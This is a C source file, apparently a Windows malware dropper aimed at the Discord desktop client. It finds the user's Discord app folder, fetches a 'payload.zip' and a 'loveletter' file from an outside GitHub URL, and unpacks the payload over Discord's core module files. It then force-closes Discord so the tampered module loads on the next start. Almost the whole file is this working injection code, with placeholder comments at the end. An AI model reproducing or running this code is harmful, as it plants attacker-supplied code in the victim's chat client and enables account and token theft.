#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <windows.h>
#include <Lmcons.h>
#include <io.h>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    return fwrite(ptr, size, nmemb, stream);
}

void getUsername(char *username, size_t size) {
    DWORD len = (DWORD)size;
    if (!GetUserNameA(username, &len)) {
        exit(EXIT_FAILURE);
    }
}

void findAppFolder(const char *base_path, char *app_path) {
    struct _finddata_t file_info;
    intptr_t handle;
    char search_path[MAX_PATH];

    snprintf(search_path, MAX_PATH, "%s/app-*", base_path);
    handle = _findfirst(search_path, &file_info);
    if (handle == -1) {
        exit(EXIT_FAILURE);
    }

    snprintf(app_path, MAX_PATH, "%s/%s", base_path, file_info.name);
    _findclose(handle);
}

int moveFiles(const char *srcDir, const char *destDir) {
    HANDLE hFind;
    WIN32_FIND_DATA findFileData;
    char srcPath[MAX_PATH];
    char destPath[MAX_PATH];
    
    snprintf(srcPath, sizeof(srcPath), "%s\\*", srcDir);

    hFind = FindFirstFile(srcPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return -1;
    }

    do {
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
            continue;
        }

        snprintf(srcPath, sizeof(srcPath), "%s\\%s", srcDir, findFileData.cFileName);
        snprintf(destPath, sizeof(destPath), "%s\\%s", destDir, findFileData.cFileName);

        MoveFileEx(srcPath, destPath, MOVEFILE_REPLACE_EXISTING);

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);

    return 0;
}

int unzipFile(const char *zipFilePath, const char *destinationFolder) {
    char command[1024];
    char unzipPath[MAX_PATH];

    snprintf(command, sizeof(command), 
             "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
             zipFilePath, destinationFolder);

    strcpy(unzipPath, destinationFolder);
    strcat(unzipPath, "/payload");

    system(command);

    moveFiles(unzipPath, destinationFolder);

    RemoveDirectory(unzipPath);
    DeleteFile(zipFilePath);

    return 0;
}

int download(const char *url, const char *output_folder) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char output_path[1024];

    const char *filename = strrchr(url, '/');
    if (!filename) {
        return 1;
    }
    filename++;

    snprintf(output_path, sizeof(output_path), "%s/%s", output_folder, filename);

    curl = curl_easy_init();
    if (!curl) {
        return 1;
    }

    fp = fopen(output_path, "wb");
    if (!fp) {
        curl_easy_cleanup(curl);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fclose(fp);
        curl_easy_cleanup(curl);
        return 1;
    }

    fclose(fp);
    curl_easy_cleanup(curl);
    return 0;
}

int main() {
    char username[UNLEN + 1] = {0};
    char base_path[MAX_PATH];
    char app_folder[MAX_PATH];
    char zip_folder[MAX_PATH];

    getUsername(username, sizeof(username));

    snprintf(base_path, MAX_PATH, "C:/Users/%s/AppData/Local/Discord", username);
    findAppFolder(base_path, app_folder);

    snprintf(base_path, MAX_PATH, "%s/modules/discord_desktop_core-1/discord_desktop_core", app_folder);

    download("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/exe.loveletter.txt", base_path);
    
    ShellExecuteA(NULL, "open", "exe.loveletter.txt", NULL, NULL, SW_SHOW);

    download("https://raw.githubusercontent.com/MrEggsBenedict/ILoveYou/refs/heads/main/payload.zip", base_path);

    strcpy(zip_folder, base_path);
    strcat(zip_folder, "/payload.zip");

    unzipFile(zip_folder, base_path);

    system("taskkill /F /IM discord.exe");

    // code //



    // .... //

    return 0;
}
